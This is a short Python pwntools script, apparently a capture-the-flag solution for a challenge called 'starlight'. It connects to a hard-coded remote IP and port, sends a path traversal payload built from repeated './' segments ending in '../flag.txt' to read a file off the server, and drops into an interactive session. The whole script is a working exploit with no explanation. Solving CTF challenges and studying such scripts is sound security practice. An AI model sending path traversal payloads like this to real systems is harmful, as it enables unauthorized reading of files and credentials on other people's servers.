

from pwn import *

p = remote("203.34.119.237", 11337)
# p = process('./starlight')

p.sendline("./"*53 + "../flag.txt")

p.interactive()
p.close()